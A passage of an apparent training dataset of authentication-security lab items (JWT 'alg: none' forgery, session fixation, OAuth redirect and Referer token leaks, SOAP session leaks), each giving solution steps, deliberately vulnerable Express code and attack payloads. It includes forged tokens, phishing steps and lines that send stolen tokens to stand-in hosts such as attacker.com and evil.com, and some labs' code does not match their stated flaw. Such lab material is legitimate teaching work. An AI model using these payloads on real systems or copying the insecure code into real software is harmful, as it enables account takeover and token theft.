      "Query Carlos’s user data and extract his email field to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { me: String }`); const root = { me: (args, context) => context.username === 'carlos' ? 'carlos@example.com' : 'Access denied' }; app.use('/graphql', (req, res, next) => { const auth = req.headers.authorization || ''; const token = auth.split(' ')[1]; let decoded = {}; try { decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') req.user = decoded.payload; else req.user = jwt.verify(token, 'supersecret'); } catch (e) {} next(); }, graphqlHTTP((req) => ({ schema, rootValue: root, context: req.user || {} }))); app.listen(4001);",
    "payloads": [
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "GraphQL query: { me }"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration vulnerability in SOAP-based login flow via Referer leakage",
    "Lab Description": "The application uses a SOAP endpoint for federated OAuth login. Upon successful login, the OAuth token is embedded in a redirect URL. However, sensitive tokens are leaked via the Referer header when redirected to third-party resources. An attacker can steal the token if they inject external content into the flow. To solve: steal Carlos’s OAuth token via Referer leakage and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate a normal login and inspect the final redirection URL which includes the token as a query parameter.",
      "Observe that the token is passed in full URL to the final destination including third-party images.",
      "Inject a <img src='http://attacker.com/steal?token=...'> into the SOAP login success handler.",
      "Trigger Carlos to authenticate. The Referer header will leak the token to the attacker's server.",
      "Replay the stolen token to access /user-info as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const tokens = { carlos: 'oauth-token-123' }; app.use(bodyParser.text({ type: 'text/xml' })); app.post('/soap-login', (req, res) => { if (req.body.includes('<username>carlos</username>') && req.body.includes('<password>securepass</password>')) { const response = `<SOAP-ENV:Envelope><SOAP-ENV:Body><redirect>http://vulnerable-app.com/welcome?token=${tokens.carlos}</redirect></SOAP-ENV:Body></SOAP-ENV:Envelope>`; res.send(response); } else { res.status(403).send('Invalid login'); } }); app.get('/user-info', (req, res) => { const token = req.query.token; if (token === tokens.carlos) res.send('Carlos: carlos@example.com'); else res.status(401).send('Invalid token'); }); app.listen(4002);",
    "payloads": [
      "POST /soap-login with SOAP body containing carlos credentials",
      "Inject <img src='http://evil.com/log?leak'> in response handler",
      "GET /user-info?token=oauth-token-123"
    ]
  },
    {
      "Lab scenario": "JWT token tampering in session management",
      "Lab Description": "This lab contains a vulnerability where the server doesn't properly validate or invalidate JWT tokens. An attacker can manipulate the JWT's payload to escalate privileges or impersonate another user. The objective is to hijack Carlos’s account by tampering with the JWT token.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Using Burp Suite, intercept the login request and capture the JWT token in the response header.",
        "2. Modify the JWT token by tampering with the user role or other claims in the payload. Use an online JWT decoding tool to examine the token's structure.",
        "3. Base64-decode the JWT token and alter the 'role' or 'username' claim.",
        "4. Re-encode the token with a malicious claim and send it back to the server as part of the Authorization header.",
        "5. After sending the manipulated token, verify that you have gained access to Carlos's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'password123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).send('Invalid credentials'); } const token = jwt.sign({ username: user.username, role: user.role }, 'secret', { expiresIn: '1h' }); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers['authorization']; if (!token) return res.status(403).send('Token required'); jwt.verify(token, 'secret', (err, decoded) => { if (err) return res.status(403).send('Invalid token'); res.send(`Welcome ${decoded.username}`); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:' + PORT));"
    },
    {
      "Lab scenario": "OAuth misconfiguration leading to privilege escalation",
      "Lab Description": "This lab demonstrates an OAuth misconfiguration where a poorly implemented OAuth flow grants unauthorized access to protected resources. The goal is to exploit this misconfiguration to escalate privileges and access Carlos's account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Using Postman, send an OAuth authorization request to the vulnerable API with your own client credentials.",
        "2. Analyze the OAuth token exchange process and note that the server incorrectly accepts a user’s token without validating the required scopes.",
        "3. Craft a malicious request that bypasses the scope validation using valid OAuth tokens but requesting a higher privilege level.",
        "4. Observe the response and confirm that the privilege escalation was successful.",
        "5. Access Carlos’s account page by exploiting the misconfiguration."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'carlos', password: 'securepassword', role: 'user' }]; const oauthTokens = {}; app.post('/authorize', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).send('Invalid credentials'); } const token = `oauth_token_${user.username}_${user.role}`; oauthTokens[username] = token; res.json({ token }); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']; if (!token || !oauthTokens[token]) { return res.status(403).send('Unauthorized'); } const user = users.find(u => `oauth_token_${u.username}_${u.role}` === token); res.json({ message: `Welcome ${user.username}, role: ${user.role}` }); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));"
    },
    {
      "Lab scenario": "Session fixation attack in session management",
      "Lab Description": "This lab contains a session fixation vulnerability where the application does not properly regenerate session IDs on login. An attacker can fix a session ID and hijack a user's session. The goal is to fix a session ID and gain access to Carlos's account page.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "1. Log in to your own account and capture the session ID in the cookies using Burp Suite.",
        "2. Log out and use the same session ID to log in again, maintaining the session state.",
        "3. Modify the session ID to that of Carlos and make a request to the /account endpoint.",
        "4. Verify that you have successfully hijacked Carlos's session and gained access to his account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'password123', sessionId: 'user123session' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) { return res.status(401).send('Invalid credentials'); } res.cookie('sessionId', user.sessionId); res.send('Logged in'); }); app.get('/account', (req, res) => { const sessionId = req.cookies.sessionId; const user = users.find(u => u.sessionId === sessionId); if (user) { res.send(`Welcome ${user.username}`); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));"
    },
  {
    "Lab scenario": "Session Fixation in SAML-based SSO REST Login Flow",
    "Lab Description": "The application implements Single Sign-On (SSO) using SAML for authentication across multiple services. The session ID is issued before the SAML assertion is validated. The application incorrectly associates the session with the user after the assertion is processed but does not regenerate the session ID. To solve: Fixate a session before authentication and hijack Carlos’s session after SSO completes.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the initial GET /sso/login request. Note that a Set-Cookie: session=XYZ123 is issued before login completes.",
      "Send a SAML authentication request for the attacker to Burp Repeater and observe the SAMLResponse POST to /sso/callback with the same session ID.",
      "Fixate the session ID: Send Carlos the crafted login link including the pre-set session cookie (e.g., via phishing).",
      "After Carlos logs in through SSO, reuse the fixed session ID and access /my-account with it.",
      "Observe the account details of Carlos and confirm hijacked session to complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = { carlos: { id: 1, name: 'Carlos', email: 'carlos@example.com' } }; app.get('/sso/login', (req, res) => { const sessionId = Math.random().toString(36).substring(2); sessions[sessionId] = {}; res.cookie('session', sessionId); res.redirect('https://sso-provider.com/authenticate'); }); app.post('/sso/callback', (req, res) => { const { SAMLResponse } = req.body; const sessionId = req.cookies.session; if (validateSAML(SAMLResponse)) { sessions[sessionId].user = 'carlos'; res.redirect('/my-account'); } else { res.status(403).send('Invalid SAML'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.session; const session = sessions[sessionId]; if (session && session.user) { res.send(`Account page for ${session.user}`); } else { res.status(401).send('Not logged in'); } }); function validateSAML(response) { return true; } app.listen(4000);",
    "payloads": [
      "Set-Cookie: session=attackerSession; URL=/sso/login",
      "Use attackerSession after victim SSO to access /my-account"
    ]
  },
  {
    "Lab scenario": "JWT Kid Header Injection with Public Key Retrieval (JWK endpoint)",
    "Lab Description": "The application uses JWT tokens for user authentication, validating them using a public key fetched from a JWK endpoint. However, the server uses the 'kid' field from the JWT header without validation, allowing injection and remote key usage. To solve: Forge a valid token for the 'admin' user using a tampered kid header pointing to your controlled public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a JWT token using Postman by logging in as a regular user. Decode it to observe the header and payload.",
      "Observe that the JWT header includes a 'kid' field, and the server fetches the public key dynamically.",
      "Set up a malicious JWKS endpoint on a controlled server returning your public key with a kid of 'malicious-key'.",
      "Craft a JWT token with kid='malicious-key', change payload to { \"user\": \"admin\" }, and sign it with your private key.",
      "Send the forged token in the Authorization: Bearer header and access /admin-panel to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const axios = require('axios'); const app = express(); app.use(express.json()); async function getKey(header) { const jwks = await axios.get(`https://jwks.internal/api/keys`); return jwks.data.keys.find(k => k.kid === header.kid).publicKey; } app.post('/validate', async (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const pubKey = await getKey(decoded.header); try { const verified = jwt.verify(token, pubKey); if (verified.user === 'admin') res.send('Admin panel access granted'); else res.status(403).send('Not authorized'); } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(3001);",
    "payloads": [
      "Header: { \"alg\": \"RS256\", \"kid\": \"malicious-key\" }",
      "Payload: { \"user\": \"admin\" }",
      "Sign with private key matching JWKS public key"
    ]
  },
  {
    "Lab scenario": "SOAP API Session ID Leakage in Verbose Error Logs",
    "Lab Description": "The application exposes a legacy SOAP API for admin actions. When an invalid session ID is supplied, the server includes recent session logs in the verbose SOAP Fault response. An attacker can extract valid session IDs from leaked logs and hijack the session. To solve: Extract Carlos’s session ID from a SOAP fault and use it to access the admin SOAP action.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a malformed SOAP request to /soap/admin using OWASP ZAP. Trigger an invalid session fault by setting SessionID=invalid123.",
      "In the SOAP fault response, observe the stack trace and verbose log dump containing session IDs.",
      "Extract the latest session ID linked to Carlos (e.g., SessionID: abcd1234 for user carlos).",
      "Craft a valid SOAP envelope and set SessionID=abcd1234.",
      "Send the SOAP request and receive the successful admin action response to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(bodyParser.text({ type: '*/xml' })); const sessions = { 'abcd1234': 'carlos' }; app.post('/soap/admin', (req, res) => { const match = req.body.match(/<SessionID>(.*?)<\\/SessionID>/); const sessionId = match ? match[1] : null; if (!sessions[sessionId]) { return res.status(500).send(`<SOAP-ENV:Fault><faultcode>SOAP-ENV:Server</faultcode><faultstring>Invalid Session</faultstring><detail><debug>SessionID not found: ${sessionId} | Stack trace: session=abcd1234;user=carlos;trace=NullReference</debug></detail></SOAP-ENV:Fault>`); } res.send(`<SOAP-ENV:Envelope><Result>Admin Action Executed</Result></SOAP-ENV:Envelope>`); }); app.listen(4002);",
    "payloads": [
      "<SessionID>invalid123</SessionID> to trigger leak",
      "<SessionID>abcd1234</SessionID> to hijack"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Unchanged Session ID in OAuth Authorization Flow",
    "Lab Description": "This lab simulates an application integrating with an external OAuth provider. Due to improper session regeneration, session fixation is possible. The application retains the session cookie before and after the OAuth flow without assigning a new session ID. To solve: Fixate your own session and trick the victim into completing the OAuth login flow, then hijack their authenticated session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth login flow in browser and capture request using Burp Suite.",
      "Observe session cookie remains unchanged pre/post-OAuth flow.",
      "Use Burp to log in with your own OAuth identity and note the fixed session cookie.",
      "Craft phishing link to initiate OAuth flow using your own session and send to victim.",
      "After victim logs in through OAuth, reuse the session ID to access their authenticated account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const request = require('request'); const app = express(); app.use(session({ secret: 'oauth-lab', resave: false, saveUninitialized: true })); app.get('/auth/callback', (req, res) => { if (req.query.code) { req.session.user = { name: 'carlos', email: 'carlos@example.com' }; console.log('OAuth user logged in:', req.session); res.redirect('/dashboard'); } else { res.status(400).send('Missing code'); } }); app.get('/dashboard', (req, res) => { if (req.session.user) { res.send(`Welcome ${req.session.user.name}`); } else { res.redirect('/login'); } }); app.get('/login', (req, res) => { res.send('<a href=\"https://oauth.example.com/auth?redirect_uri=/auth/callback\">Login with OAuth</a>'); }); app.listen(5000, () => console.log('OAuth Fixation Lab running on port 5000'));",
    "payloads": [
      "Crafted link: https://target.com/auth/callback?code=attacker-session",
      "Reuse fixed session cookie post-OAuth: session=attackerFixedValue"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Authentication Bypass in REST API",
    "Lab Description": "The application uses JWT for user authentication in its REST API. However, it incorrectly trusts unsigned JWTs when the 'alg' header is set to 'none'. To solve: Forge a valid JWT with no signature and access the admin API endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture authenticated request to /api/user/profile using Postman.",
      "Inspect JWT in Authorization header and decode with jwt.io.",
      "Craft unsigned JWT with alg set to 'none' and payload {\"role\":\"admin\"}.",
      "Replace token in Authorization header and send request to /api/admin.",
      "Confirm elevated access through response or resource visibility."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/api/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret', { algorithms: ['HS256', 'none'] }); if (decoded.role === 'admin') return res.send('Admin access granted'); return res.status(403).send('Insufficient privileges'); } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(3001, () => console.log('JWT None Bypass Lab running on port 3001'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"admin\",\"role\":\"admin\"}",
      "Unsigned JWT: base64(header).base64(payload)."
    ]
  },
  {
    "Lab scenario": "SOAP API Session Timeout Misconfiguration Enabling Forced Browsing",
    "Lab Description": "The backend SOAP interface allows session tokens to remain valid beyond logout due to a misconfigured timeout and improper invalidation. The application fails to destroy server-side session references. To solve: Log out your session, capture the token, and reuse it to force-browse into the protected SOAP endpoint for Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to proxy requests and capture SOAP Auth response.",
      "Note the JSESSIONID assigned post-login and capture the SOAPAction header.",
      "Log out using /soap/logout but observe session ID remains unchanged.",
      "Resend original JSESSIONID to /soap/getUserDetails with target user parameter as carlos.",
      "Verify access to Carlos's account via SOAP response body."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text({ type: '*/*' })); app.use(cookieParser()); const sessions = {}; app.post('/soap/login', (req, res) => { const match = req.body.match(/<username>(.*?)<\\/username>.*<password>(.*?)<\\/password>/); if (match && match[1] === 'user' && match[2] === 'pass') { const sid = 'sess_' + Math.random().toString(36).substring(2); sessions[sid] = 'user'; res.cookie('JSESSIONID', sid); res.send('<soap:Envelope><login>Success</login></soap:Envelope>'); } else { res.status(401).send('Invalid'); } }); app.post('/soap/getUserDetails', (req, res) => { const sid = req.cookies.JSESSIONID; if (sessions[sid]) { const user = req.body.includes('<user>carlos</user>') ? 'Carlos Sensitive Info' : 'Your Info'; res.send(`<soap:Envelope><data>${user}</data></soap:Envelope>`); } else { res.status(403).send('Forbidden'); } }); app.post('/soap/logout', (req, res) => { res.send('<soap:Envelope><logout>Success</logout></soap:Envelope>'); }); app.listen(4001, () => console.log('SOAP Session Misconfig Lab running on port 4001'));",
    "payloads": [
      "SOAP Body: <user>carlos</user>",
      "Cookie: JSESSIONID=sess_fixedvalue",
      "SOAPAction: getUserDetails"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Pre-Set Session Cookie in REST Login Endpoint",
    "Lab Description": "The application exposes a REST-based login flow where a session identifier is issued before authentication and accepted after login. The vulnerable logic accepts any preset session ID and binds it to the user after successful login. To solve: Fixate Carlos's session ID before login and hijack his session post-authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /api/login page to observe the Set-Cookie header assigning session ID pre-login.",
      "2. Send the GET /api/login request to Burp Repeater. Add a custom cookie: sessionid=attackerSession123 and resend.",
      "3. Register a new user and log in using that session. Notice the session gets bound to the logged-in user.",
      "4. Send a crafted phishing link to Carlos containing the preset sessionid=attackerSession123 in the Cookie header.",
      "5. After Carlos logs in via that session, access /api/account with sessionid=attackerSession123 to verify hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = [{ username: 'carlos', password: 'welcome123' }]; app.get('/api/login', (req, res) => { const sid = req.cookies.sessionid || 'sess_' + Math.random().toString(36).substr(2); res.cookie('sessionid', sid); sessions[sid] = null; res.send('Login page'); }); app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Login failed'); const sid = req.cookies.sessionid; if (sid) sessions[sid] = user.username; res.send('Logged in'); }); app.get('/api/account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user) res.send('Welcome ' + user); else res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "Cookie: sessionid=fixedCarlosSession",
      "Phishing URL with preset Cookie header",
      "GET /api/account with sessionid=fixedCarlosSession"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in Authorization Header (GraphQL API)",
    "Lab Description": "The GraphQL API uses JSON Web Tokens (JWT) for authentication. However, the backend improperly trusts tokens with `alg: none`, leading to full impersonation. To solve: Forge a JWT for Carlos using the 'none' algorithm and access his profile data via GraphQL.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to send a query to /graphql with a valid JWT in Authorization header and observe response format.",
      "2. Decode your JWT token using jwt.io and observe the `alg` field in the header.",
      "3. Replace the algorithm with 'none', set 'sub' to 'carlos', remove the signature completely.",
      "4. Use the forged token in Authorization: Bearer [token] and send a POST /graphql query { me { username, email } }.",
      "5. If token is accepted, extract Carlos’s data to verify the impersonation and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', email: 'carlos@example.com' }]; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'secret'); if (decoded.sub === 'carlos') { res.json({ data: { me: users[0] } }); } else { res.status(403).send('Forbidden'); } } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "JWT Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "JWT Payload: { \"sub\": \"carlos\" }",
      "Unsigned JWT: base64(header).base64(payload).",
      "Authorization: Bearer [unsigned-token]"
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception via Open Redirect in Redirect URI",
    "Lab Description": "The application uses OAuth 2.0 for login with an open redirect vulnerability in its redirect_uri parameter. This allows attackers to intercept authorization codes. To solve: Use the redirect_uri to intercept Carlos’s authorization code and exchange it for his token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Start OWASP ZAP and intercept the OAuth flow starting from GET /auth?client_id=xyz&redirect_uri=https://vuln.site/redirect.",
      "2. Modify the redirect_uri to https://evil.com/callback and observe the code parameter being leaked there.",
      "3. Trick Carlos into clicking the malicious OAuth login link using a redirect_uri to your controlled domain.",
      "4. Capture the authorization code from your server logs or OWASP ZAP.",
      "5. Use Postman to POST the code to /token endpoint: client_id=xyz&code=stolen_code&redirect_uri=https://evil.com/callback.",
      "6. Receive access_token and access Carlos’s /profile endpoint to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = { 'auth123': 'carlos_token' }; app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'auth123'; res.redirect(redirect_uri + '?code=' + code); }); app.post('/token', (req, res) => { const { code } = req.body; if (authCodes[code]) { res.json({ access_token: authCodes[code] }); } else { res.status(400).send('Invalid code'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos_token') { res.send('Carlos Profile Data'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
    "payloads": [
      "OAuth URL with redirect_uri=https://evil.com/callback",
      "Captured code=auth123 from evil.com log",
      "POST /token with code=auth123",
      "Authorization: Bearer carlos_token"
    ]
  },
  {
    "Lab scenario": "REST API Session Fixation via Path Parameter",
    "Lab Description": "This application's RESTful session handling is vulnerable to session fixation. The session token is accepted from a URL path parameter before login. The application binds the session to the authenticated user without regenerating the token. To solve: hijack Carlos's session using a fixed token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept pre-login GET /session/{token} with Burp Suite to observe session initialization.",
      "Send the same token value in POST /login request as a URL path parameter while authenticating.",
      "Craft and deliver the fixed session link with token=attacker-session-id to Carlos via social engineering.",
      "Carlos logs in via poisoned link; attacker reuses same token to access authenticated session.",
      "Verify by accessing GET /my-account with session header set to fixed token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.json()); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/session/:sid', (req, res) => { const sid = req.params.sid; sessions[sid] = { user: null }; res.cookie('session', sid); res.send('Session initialized'); }); app.post('/login/:sid', (req, res) => { const sid = req.params.sid; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = { user: username }; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.headers['x-session-id']; if (sessions[sid] && sessions[sid].user) { res.send('Welcome ' + sessions[sid].user); } else { res.status(403).send('Not logged in'); } }); app.listen(4001, () => console.log('Session Fixation Lab running on port 4001'));",
    "payloads": [
      "GET /session/fixed123",
      "POST /login/fixed123 {\"username\":\"carlos\",\"password\":\"hunter2\"}",
      "GET /my-account with Header x-session-id: fixed123"
    ]
  },
  {
    "Lab scenario": "GraphQL JWT Forgery via None Algorithm",
    "Lab Description": "This application's GraphQL login mutation issues a JWT token signed with HS256 but fails to enforce algorithm validation. To solve: forge a JWT using 'alg':'none' to impersonate the admin user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to submit a login mutation and extract the returned JWT.",
      "Decode the JWT in jwt.io and observe the algorithm used in header (HS256).",
      "Replace the alg field in JWT header with 'none' and re-encode with admin payload.",
      "Send GraphQL query with Authorization: Bearer [forged token] to access admin data.",
      "Validate lab success by fetching admin's profile with forged JWT."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'supersecret' }]; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('login')) { const { username, password } = req.body.variables; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ user: username }, 'shhhh', { algorithm: 'HS256' }); return res.json({ data: { login: token } }); } return res.status(401).json({ error: 'Invalid login' }); } else if (query.includes('getProfile')) { const auth = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(auth, 'shhhh'); if (payload.user === 'admin') return res.json({ data: { profile: 'admin details' } }); } catch (e) { return res.status(403).json({ error: 'Forbidden' }); } } }); app.listen(4002, () => console.log('JWT None Algorithm Lab running on port 4002'));",
    "payloads": [
      "{\"alg\":\"none\"}.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer [forged-token]",
      "POST /graphql { \"query\": \"query { getProfile }\" }"
    ]
  },
  {
    "Lab scenario": "OAuth Access Token Leak via Referrer Header in SOAP API",
    "Lab Description": "This application's OAuth implicit flow exposes the access token via fragment in redirect_uri. The token is leaked through the Referrer header when redirected to a SOAP endpoint with inline content. To solve: extract and reuse Carlos's leaked token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Trigger OAuth login flow and observe redirect URI format containing #access_token in URL fragment.",
      "Redirect to a SOAP endpoint with embedded inline content loading from external domain.",
      "Observe browser sends full referrer including token to attacker-controlled domain.",
      "Extract token from intercepted Referrer and use it in Authorization header.",
      "Use token to access GET /soap/user-profile?uid=carlos and retrieve sensitive data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const profiles = { 'carlos': 'Carlos Secret Profile' }; app.get('/oauth/callback', (req, res) => { const token = 'eyJhbGciOi...'; res.send(`<iframe src='/soap?uid=carlos'></iframe>`); }); app.get('/soap/user-profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'eyJhbGciOi...') { return res.send(profiles[req.query.uid]); } res.status(403).send('Access denied'); }); app.listen(4003, () => console.log('OAuth Referrer Leak Lab running on port 4003'));",
    "payloads": [
      "https://target.com/oauth/callback#access_token=eyJhbGciOi...",
      "Intercept Referer header leaking token via <iframe src>",
      "GET /soap/user-profile?uid=carlos with Authorization: Bearer eyJhbGciOi..."
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in REST authentication flow",
    "Lab Description": "This lab's session management implementation allows attackers to fixate a session ID before login. The application issues a session cookie pre-authentication and continues to use it post-login without rotating it. This allows session hijacking via fixation. To solve: Fixate a session ID, get the victim to log in, and access their account using the fixed session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login request and observe the session cookie assigned by the server.",
      "2. Note that the session remains unchanged after login, confirming the server does not rotate session tokens.",
      "3. Craft a phishing link with the session cookie set manually in the victim's browser using document.cookie or by intercepting the response.",
      "4. Wait for the victim to log in using the pre-fixed session.",
      "5. Reuse the fixed session cookie in your browser to access the victim's /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'session123' }]; app.get('/login', (req, res) => { res.cookie('sid', req.cookies.sid || Math.random().toString(36).substr(2), { httpOnly: true }); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.cookies.sid === 'victim-session') { res.send('Carlos account page'); } else { res.status(403).send('Access Denied'); } }); app.listen(3000, () => console.log('Session Fixation Lab at http://localhost:3000'));",
    "payloads": [
      "document.cookie = 'sid=victim-session';",
      "Set-Cookie: sid=victim-session",
      "GET /my-account with Cookie: sid=victim-session"
    ]
  },
  {
    "Lab scenario": "JWT tampering via algorithm confusion in GraphQL-based login",
    "Lab Description": "The JWT authentication mechanism is flawed due to unsafe handling of the 'alg' claim in the token header. The server accepts unsigned JWTs if the 'alg' is set to 'none'. To solve: Forge an unsigned JWT for the admin user and access the protected GraphQL admin dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to send a login GraphQL mutation and capture the JWT returned.",
      "2. Decode the JWT using jwt.io and inspect the header and payload structure.",
      "3. Modify the header to use 'alg':'none' and set payload to {\"username\":\"admin\"}. Remove the signature.",
      "4. Send a GraphQL query to the /graphql endpoint with the forged token in the Authorization header.",
      "5. Access the admin dashboard by querying {adminPanel {secret}} and confirm exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/graphql', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(auth, 'secret'); if (decoded.username === 'admin') return res.json({ data: { adminPanel: { secret: 'FLAG-SECRET-123' } } }); } catch (e) { return res.status(403).send('Invalid token'); } res.json({ data: { userPanel: { info: 'Normal user' } } }); }); app.listen(4000, () => console.log('JWT None Algorithm Lab on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer [unsigned JWT]",
      "GraphQL query: { adminPanel { secret } }"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect URI validation",
    "Lab Description": "The OAuth provider fails to properly validate redirect URIs, allowing attackers to steal authorization codes. The vulnerable client accepts subdomains of allowed redirect URIs, which can be exploited for code hijacking. To solve: Create a malicious subdomain to capture the authorization code for carlos and exchange it for an access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
